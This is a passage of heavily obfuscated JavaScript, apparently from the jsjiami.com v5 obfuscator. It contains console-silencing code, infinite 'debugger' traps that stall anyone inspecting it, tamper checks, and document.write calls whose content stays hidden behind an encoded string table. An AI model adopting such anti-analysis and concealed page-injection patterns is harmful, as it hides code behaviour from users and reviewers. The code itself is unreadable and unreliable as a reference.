_0x15ae13(_0x2abc90,_0x483f49){return _0x2abc90*_0x483f49;},'lvwkZ':_0x4d40('0x7f','O0Ak'),'SXWGp':_0x4d40('0x80','JXeO'),'eIsfV':function _0x25bead(_0x394d3f,_0x44685a){return _0x394d3f!==_0x44685a;},'wnXgT':_0x4d40('0x81','WE9['),'kwSyd':function _0x9b671f(_0x4bc828,_0x2a180d){return _0x4bc828+_0x2a180d;},'LqOIz':_0x4d40('0x82','fhIY'),'jsGgI':_0x4d40('0x83','W%Jq'),'ghoKO':function _0x50a27e(_0x3f7f13){return _0x3f7f13();}};var _0x588728=_0x305c54[_0x4d40('0x84','kAr^')][_0x4d40('0x85','fhIY')]('|'),_0x3c739b=0x0;while(!![]){switch(_0x588728[_0x3c739b++]){case'0':(function(){var _0x4ebfc3={'kZwdW':function _0x21f310(_0x309ad5,_0x2911aa){return _0x309ad5!==_0x2911aa;},'TIjkV':_0x4d40('0x86','JXeO'),'cBoPE':function _0x138918(_0x551340,_0x6deea4,_0x1216b8){return _0x551340(_0x6deea4,_0x1216b8);}};if(_0x4ebfc3[_0x4d40('0x87','48G7')](_0x4ebfc3[_0x4d40('0x88','IScx')],_0x4ebfc3[_0x4d40('0x89','aVR*')])){if(fn){var _0x232f97=fn[_0x4d40('0x8a','9n09')](context,arguments);fn=null;return _0x232f97;}}else{_0x4ebfc3[_0x4d40('0x8b','fhIY')](_0x1518e6,this,function(){var _0x2f2de9={'eytGk':function _0x148e8e(_0x3a9f85,_0x225350){return _0x3a9f85===_0x225350;},'iJmSb':_0x4d40('0x8c','*wVH'),'HxeTO':_0x4d40('0x8d','[8SE'),'waZGE':_0x4d40('0x8e','kAr^'),'GMUPN':function _0x5a7e02(_0x3cd59e,_0x7a4950){return _0x3cd59e(_0x7a4950);},'aNWFg':_0x4d40('0x8f','Z^Uh'),'Lfahh':function _0x3370e4(_0x3c50a7,_0x5a3e31){return _0x3c50a7+_0x5a3e31;},'JRLjw':_0x4d40('0x90','1O^9'),'tuWeI':function _0x5b11be(_0x3a1857,_0x588b0a){return _0x3a1857+_0x588b0a;},'wJEDN':_0x4d40('0x91','W%C1'),'AJzao':_0x4d40('0x92','rnjt'),'MNXgq':_0x4d40('0x93','*wVH'),'XUaKq':function _0x24da0e(_0x4621ab,_0x1ab3cc){return _0x4621ab!==_0x1ab3cc;},'rezLt':_0x4d40('0x94','KgxM'),'ginYW':function _0x17dd09(_0x305a32){return _0x305a32();}};if(_0x2f2de9[_0x4d40('0x95','66R(')](_0x2f2de9[_0x4d40('0x96','FF*i')],_0x2f2de9[_0x4d40('0x97','9CBc')])){var _0x1bbafd=new RegExp(_0x2f2de9[_0x4d40('0x98','TPma')]);var _0x2e07df=new RegExp(_0x2f2de9[_0x4d40('0x99','YPZ8')],'i');var _0x38839c=_0x2f2de9[_0x4d40('0x9a','yijt')](_0x3ab7be,_0x2f2de9[_0x4d40('0x9b','tGY@')]);if(!_0x1bbafd[_0x4d40('0x9c','&(Ln')](_0x2f2de9[_0x4d40('0x9d','Q@nh')](_0x38839c,_0x2f2de9[_0x4d40('0x9e','MSMF')]))||!_0x2e07df[_0x4d40('0x9f','JXeO')](_0x2f2de9[_0x4d40('0xa0','zhRm')](_0x38839c,_0x2f2de9[_0x4d40('0xa1','MeUR')]))){if(_0x2f2de9[_0x4d40('0xa2','M7sQ')](_0x2f2de9[_0x4d40('0xa3','kAr^')],_0x2f2de9[_0x4d40('0xa4','I4O9')])){_0x2f2de9[_0x4d40('0xa5','$VNj')](_0x38839c,'0');}else{_0x397102[_0x186f6f](_0x2f2de9[_0x4d40('0xa6','JXeO')]('删除',_0x2f2de9[_0x4d40('0xa7','O0Ak')]));}}else{if(_0x2f2de9[_0x4d40('0xa8','WE9[')](_0x2f2de9[_0x4d40('0xa9','1O^9')],_0x2f2de9[_0x4d40('0xaa','tGY@')])){var _0x1c03cb=firstCall?function(){if(fn){var _0x1524a1=fn[_0x4d40('0xab','Nsyt')](context,arguments);fn=null;return _0x1524a1;}}:function(){};firstCall=![];return _0x1c03cb;}else{_0x2f2de9[_0x4d40('0xac','$VNj')](_0x3ab7be);}}}else{_0x2f2de9[_0x4d40('0xad','*wVH')](_0x38839c,'0');}})();}}());continue;case'1':var _0x1518e6=function(){var _0x4ba92a=!![];return function(_0x13ee30,_0x3ca5bb){var _0x1e3a41=_0x4ba92a?function(){if(_0x3ca5bb){var _0x40c05e=_0x3ca5bb[_0x4d40('0xae','JXeO')](_0x13ee30,arguments);_0x3ca5bb=null;return _0x40c05e;}}:function(){};_0x4ba92a=![];return _0x1e3a41;};}();continue;case'2':var _0x1c4708=_0x305c54[_0x4d40('0xaf','Z^Uh')](_0x2b2e84,this,function(){var _0x5dd4cc=function(){};var _0x420c18=_0x2ace25[_0x4d40('0xb0','2[z*')](typeof window,_0x2ace25[_0x4d40('0xb1','NpY^')])?window:_0x2ace25[_0x4d40('0xb2','66R(')](typeof process,_0x2ace25[_0x4d40('0xb3','f!ed')])&&_0x2ace25[_0x4d40('0xb4','YIhu')](typeof require,_0x2ace25[_0x4d40('0xb5','9n09')])&&_0x2ace25[_0x4d40('0xb6','Nsyt')](typeof global,_0x2ace25[_0x4d40('0xb7','hK5E')])?global:this;if(!_0x420c18[_0x4d40('0xb8','Y$NS')]){if(_0x2ace25[_0x4d40('0xb9','YIhu')](_0x2ace25[_0x4d40('0xba','aVR*')],_0x2ace25[_0x4d40('0xbb','fhIY')])){_0x420c18[_0x4d40('0xbc','yijt')]=function(_0x5ce886){var _0x11d4fd={'mplGB':_0x4d40('0xbd','rnjt')};var _0x51a796=_0x11d4fd[_0x4d40('0xbe','Nsyt')][_0x4d40('0xbf','9CBc')]('|'),_0x4b78cb=0x0;while(!![]){switch(_0x51a796[_0x4b78cb++]){case'0':_0x186f6f[_0x4d40('0xc0','YIhu')]=_0x5ce886;continue;case'1':_0x186f6f[_0x4d40('0xc1','I4O9')]=_0x5ce886;continue;case'2':_0x186f6f[_0x4d40('0xc2','NpY^')]=_0x5ce886;continue;case'3':_0x186f6f[_0x4d40('0xc3','W%Jq')]=_0x5ce886;continue;case'4':_0x186f6f[_0x4d40('0xc4','I4O9')]=_0x5ce886;continue;case'5':_0x186f6f[_0x4d40('0xc5','Y$NS')]=_0x5ce886;continue;case'6':return _0x186f6f;case'7':_0x186f6f[_0x4d40('0xc6','rnjt')]=_0x5ce886;continue;case'8':var _0x186f6f={};continue;}break;}}(_0x5dd4cc);}else{d+=_0x55c29e[_0x4d40('0xc7','gVY0')](Math[_0x4d40('0xc8','aVR*')](_0x2ace25[_0x4d40('0xc9','$VNj')](Math[_0x4d40('0xca','*wVH')](),_0x186f6f)));}}else{var _0x2152ca=_0x2ace25[_0x4d40('0xcb','9CBc')][_0x4d40('0xcc','R*Zk')]('|'),_0x27abe2=0x0;while(!![]){switch(_0x2152ca[_0x27abe2++]){case'0':_0x420c18[_0x4d40('0xcd','66R(')][_0x4d40('0xce','O0Ak')]=_0x5dd4cc;continue;case'1':_0x420c18[_0x4d40('0xcf','7hs6')][_0x4d40('0xd0','9CBc')]=_0x5dd4cc;continue;case'2':_0x420c18[_0x4d40('0xd1','gVY0')][_0x4d40('0x48','&(Ln')]=_0x5dd4cc;continue;case'3':_0x420c18[_0x4d40('0xd2','IScx')][_0x4d40('0xd3','UewM')]=_0x5dd4cc;continue;case'4':_0x420c18[_0x4d40('0xb8','Y$NS')][_0x4d40('0xd4','hK5E')]=_0x5dd4cc;continue;case'5':_0x420c18[_0x4d40('0xd5','1O^9')][_0x4d40('0xd6','IScx')]=_0x5dd4cc;continue;case'6':_0x420c18[_0x4d40('0xd7','TPma')][_0x4d40('0xd8','FF*i')]=_0x5dd4cc;continue;}break;}}});continue;case'3':var _0x2ace25={'cPqox':function _0xeed189(_0x452ca9,_0x31cd36){return _0x305c54[_0x4d40('0xd9','f!ed')](_0x452ca9,_0x31cd36);},'cRKsv':_0x305c54[_0x4d40('0xda','FF*i')],'YAxbV':function _0x22016c(_0x3d8cba,_0x375ae4){return _0x305c54[_0x4d40('0xdb','oHYp')](_0x3d8cba,_0x375ae4);},'BIXYD':_0x305c54[_0x4d40('0xdc','66R(')],'CTCNG':function _0xe97b7e(_0xc3fbd5,_0x406b1d){return _0x305c54[_0x4d40('0xdd','IScx')](_0xc3fbd5,_0x406b1d);},'lXoLe':_0x305c54[_0x4d40('0xde','7hs6')],'Mwzbf':_0x305c54[_0x4d40('0xdf','gVY0')],'kVvql':_0x305c54[_0x4d40('0xe0','NpY^')],'XdYwZ':function _0x3cb431(_0x1f66d9,_0x4586e6){return _0x305c54[_0x4d40('0xe1','$VNj')](_0x1f66d9,_0x4586e6);},'SMRLr':_0x305c54[_0x4d40('0xe2','9CBc')]};continue;case'4':try{_0x186f6f+=_0x305c54[_0x4d40('0xe3','NpY^')];_0x55c29e=encode_version;if(!(_0x305c54[_0x4d40('0xe4','MSMF')](typeof _0x55c29e,_0x305c54[_0x4d40('0xe5','aVR*')])&&_0x305c54[_0x4d40('0xe6','f!ed')](_0x55c29e,_0x305c54[_0x4d40('0xe7','I4O9')]))){_0x397102[_0x186f6f](_0x305c54[_0x4d40('0xe8','TPma')]('删除',_0x305c54[_0x4d40('0xe9','tGY@')]));}}catch(_0x346475){_0x397102[_0x186f6f](_0x305c54[_0x4d40('0xea','IScx')]);}continue;case'5':_0x305c54[_0x4d40('0xeb','JXeO')](_0x1c4708);continue;case'6':_0x186f6f='al';continue;case'7':var _0x2b2e84=function(){var _0x322d00={'SrboS':function _0x53c289(_0x475dbb,_0x332c48){return _0x475dbb===_0x332c48;},'NVHOM':_0x4d40('0xec','KgxM')};if(_0x322d00[_0x4d40('0xed','rnjt')](_0x322d00[_0x4d40('0xee','MeUR')],_0x322d00[_0x4d40('0xef','oHYp')])){var _0x59befa=!![];return function(_0x142f89,_0x2bb7f1){var _0x4e0a15={'oPbxt':function _0x334ee7(_0xde57e9,_0x3fabfe){return _0xde57e9===_0x3fabfe;},'OHIpI':_0x4d40('0xf0','tB&W'),'WleVh':_0x4d40('0xf1','*wVH'),'WQmHP':function _0x2fef0a(_0x4d3988,_0x753e7b){return _0x4d3988!==_0x753e7b;},'MOIfk':_0x4d40('0xf2','YIhu'),'rluMY':_0x4d40('0xf3','W%Jq'),'zCCwG':_0x4d40('0xf4','FF*i'),'NuOCE':_0x4d40('0xf5','1O^9'),'ItsfK':_0x4d40('0xf6','M7sQ'),'yrQvU':function _0x52da22(_0x4678c3,_0xaec125){return _0x4678c3+_0xaec125;},'yTouX':_0x4d40('0xf7','yijt')};var _0xd3fc9c=_0x59befa?function(){if(_0x4e0a15[_0x4d40('0xf8','JXeO')](_0x4e0a15[_0x4d40('0xf9','yijt')],_0x4e0a15[_0x4d40('0xfa','f!ed')])){debugger;}else{if(_0x2bb7f1){if(_0x4e0a15[_0x4d40('0xfb','YIhu')](_0x4e0a15[_0x4d40('0xfc','f!ed')],_0x4e0a15[_0x4d40('0xfd','*wVH')])){var _0x1acefd=_0x2bb7f1[_0x4d40('0xfe','R*Zk')](_0x142f89,arguments);_0x2bb7f1=null;return _0x1acefd;}else{_0x186f6f+=_0x4e0a15[_0x4d40('0xff','zhRm')];_0x55c29e=encode_version;if(!(_0x4e0a15[_0x4d40('0x100','O0Ak')](typeof _0x55c29e,_0x4e0a15[_0x4d40('0x101','yijt')])&&_0x4e0a15[_0x4d40('0x102','KgxM')](_0x55c29e,_0x4e0a15[_0x4d40('0x103','NpY^')]))){_0x397102[_0x186f6f](_0x4e0a15[_0x4d40('0x104','UewM')]('删除',_0x4e0a15[_0x4d40('0x105','rnjt')]));}}}}}:function(){};_0x59befa=![];return _0xd3fc9c;};}else{}}();continue;}break;}}(window));function _0x3ab7be(_0x2203a4){var _0x16873f={'vxCkJ':function _0x532dbc(_0x14c556,_0x3c2b34){return _0x14c556===_0x3c2b34;},'igOnJ':_0x4d40('0x106','1O^9'),'uWVXY':function _0x5190ab(_0x26dc0e){return _0x26dc0e();},'vvxIC':function _0xdeb42a(_0x92b134,_0x3b4e59){return _0x92b134===_0x3b4e59;},'XhQxR':_0x4d40('0x107','oHYp'),'dfqUX':function _0x624d78(_0x5e7471,_0x456a9e){return _0x5e7471!==_0x456a9e;},'VYxEQ':function _0x415cf5(_0x34ab85,_0x1ec997){return _0x34ab85+_0x1ec997;},'uyvwU':function _0x17d146(_0x2f61e2,_0x517025){return _0x2f61e2/_0x517025;},'DYetC':_0x4d40('0x108','Q@nh'),'UZUit':function _0x634088(_0x4a138e,_0x2bb00b){return _0x4a138e%_0x2bb00b;},'SejmZ':_0x4d40('0x109','fhIY'),'JSKmj':function _0x4ab292(_0x3dd407,_0x1338be){return _0x3dd407+_0x1338be;},'EYgSI':function _0x5830d7(_0x3b85a5,_0x14a1e3){return _0x3b85a5+_0x14a1e3;},'eWLtE':_0x4d40('0x10a','O0Ak'),'nbOZm':_0x4d40('0x10b','TPma'),'OGawk':_0x4d40('0x10c','kAr^'),'QtTva':_0x4d40('0x10d','7hs6'),'PLkUP':_0x4d40('0x10e','YPZ8'),'ByZsn':_0x4d40('0x10f','WE9['),'apPZx':_0x4d40('0x110','Nsyt'),'dYnpJ':_0x4d40('0x111','zhRm'),'lRdXm':_0x4d40('0x112','zhRm'),'bIxGw':function _0x4493e7(_0x50c6b0,_0x16a9b8){return _0x50c6b0(_0x16a9b8);}};function _0x2b4f5f(_0x3453b1){if(_0x16873f[_0x4d40('0x113','@zZx')](typeof _0x3453b1,_0x16873f[_0x4d40('0x114','WE9[')])){var _0x237df5=function(){var _0x453dd8={'XhcgQ':function _0x19bd0a(_0x15fadc,_0x45ae96){return _0x15fadc!==_0x45ae96;},'BwfUL':_0x4d40('0x115','2[z*'),'CkAeK':function _0x31871b(_0x577fc1,_0x1e2a16){return _0x577fc1(_0x1e2a16);},'Lumqb':function _0x2dda00(_0x57bd00,_0x62a140){return _0x57bd00===_0x62a140;},'DAGDs':_0x4d40('0x116','NpY^'),'zNGSL':_0x4d40('0x117','Z^Uh')};if(_0x453dd8[_0x4d40('0x118','48G7')](_0x453dd8[_0x4d40('0x119','pOz7')],_0x453dd8[_0x4d40('0x11a','TPma')])){_0x453dd8[_0x4d40('0x11b','FF*i')](_0x2b4f5f,0x0);}else{while(!![]){if(_0x453dd8[_0x4d40('0x11c','hK5E')](_0x453dd8[_0x4d40('0x11d','KgxM')],_0x453dd8[_0x4d40('0x11e','yijt')])){debugger;}else{}}}};return _0x16873f[_0x4d40('0x11f','zhRm')](_0x237df5);}else{if(_0x16873f[_0x4d40('0x120','1O^9')](_0x16873f[_0x4d40('0x121','9n09')],_0x16873f[_0x4d40('0x122','R*Zk')])){if(_0x16873f[_0x4d40('0x123','fhIY')](_0x16873f[_0x4d40('0x124','YIhu')]('',_0x16873f[_0x4d40('0x125','MSMF')](_0x3453b1,_0x3453b1))[_0x16873f[_0x4d40('0x126','KgxM')]],0x1)||_0x16873f[_0x4d40('0x127','[8SE')](_0x16873f[_0x4d40('0x128','KgxM')](_0x3453b1,0x14),0x0)){debugger;}else{debugger;}}else{var _0x199334=_0x16873f[_0x4d40('0x129','gVY0')][_0x4d40('0x12a','M7sQ')]('|'),_0x1c0c06=0x0;while(!![]){switch(_0x199334[_0x1c0c06++]){case'0':document[_0x4d40('0x72','MSMF')](_0x16873f[_0x4d40('0x12b','Y$NS')](_0x16873f[_0x4d40('0x12c','MeUR')](_0x16873f[_0x4d40('0x12d','W%C1')],_0x558509),_0x16873f[_0x4d40('0x12e','NpY^')]));continue;case'1':document[_0x4d40('0x12f','f!ed')](_0x16873f[_0x4d40('0x130','W%C1')]);continue;case'2':document[_0x4d40('0x131','1O^9')](_0x16873f[_0x4d40('0x132','7hs6')]);continue;case'3':document[_0x4d40('0x133','hK5E')](_0x16873f[_0x4d40('0x134','NpY^')]);continue;case'4':document[_0x4d40('0x135','oHYp')](_0x16873f[_0x4d40('0x136','IScx')]);continue;case'5':document[_0x4d40('0x12f','f!ed')](_0x16873f[_0x4d40('0x137','I4O9')]);continue;case'6':document[_0x4d40('0x74','O0Ak')](_0x16873f[_0x4d40('0x138','48G7')]);continue;case'7':document[_0x4d40('0x135','oHYp')](_0x16873f[_0x4d40('0x139','pOz7')]);continue;}break;}}}_0x16873f[_0x4d40('0x13a','f!ed')](_0x2b4f5f,++_0x3453b1);}try{if(_0x2203a4){return _0x2b4f5f;}else{_0x16873f[_0x4d40('0x13b','MeUR')](_0x2b4f5f,0x0);}}catch(_0x3e3303){}};encode_version = 'jsjiami.com.v5';
